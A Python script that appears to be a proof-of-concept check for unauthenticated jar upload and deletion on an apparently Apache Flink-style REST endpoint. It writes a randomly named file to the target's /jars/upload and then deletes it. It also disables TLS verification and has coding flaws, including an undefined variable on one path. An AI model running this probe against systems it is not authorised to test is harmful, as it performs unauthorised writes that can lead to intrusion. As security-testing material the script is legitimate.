import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def randomLowercase(n):
	key=""
	zf="qwertyuiopasdfghjklzxcvbnm"
	import random
	for _ in range(n):
		suiji1=random.randint(0,len(zf)-1)
		key+=zf[suiji1]
	return key
r11=randomLowercase(8)
def randomLowercase(n):
	key=""
	zf="qwertyuiopasdfghjklzxcvbnm"
	import random
	for _ in range(n):
		suiji1=random.randint(0,len(zf)-1)
		key+=zf[suiji1]
	return key
r22=randomLowercase(4)
def scan(baseurl):
	if baseurl[-1]=='/':
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"jars"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	reditList = response.history
	if len(reditList)>0:
		f_list=[]
		for response in reditList:
			if response.status_code == 200 and "json" in response.headers["Content-Type"] and "address" in response.text and "files" in response.text:
				f_list.append(1)
		if len(f_list)==1:
			r0=True
		else:
			r0=False
	else:
		if response.status_code == 200 and "json" in response.headers["Content-Type"] and "address" in response.text and "files" in response.text:
			r0=True
		else:
			r0=False
	url=baseurl+"jars/upload"
	body='''--8ce4b16b22b58894aa86c421e8759df3\r
Content-Disposition: form-data; name="jarfile";filename='''+r22+'''.jar"\r
Content-Type:application/octet-stream\r
\r
'''+r11+'''\r
--8ce4b16b22b58894aa86c421e8759df3--\r
'''
	headers={'Content-Type': 'multipart/form-data;boundary=8ce4b16b22b58894aa86c421e8759df3'}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	reditList = response.history
	if len(reditList)>0:
		f_list=[]
		for response in reditList:
			if response.status_code == 200 and "json" in response.headers["Content-Type"] and "success" in response.text and r22 in response.text:
				f_list.append(1)
		if len(f_list)==1:
			r1=True
		else:
			r1=False
	else:
		if response.status_code == 200 and "json" in response.headers["Content-Type"] and "success" in response.text and r22 in response.text:
			filen=re.findall('[a-zA-Z0-9]{8}-[a-zA-Z0-9]{4}-[a-zA-Z0-9]{4}-[a-zA-Z0-9]{4}-[a-zA-Z0-9]{12}_[a-z]{4}.jar',response.text)[0]
			r1=True
		else:
			r1=False
	url=baseurl+"jars/"+filen
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.delete(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200:
		r2=True
	else:
		r2=False
	if r0 and r1 and r2:
		return True
	else:
		return False
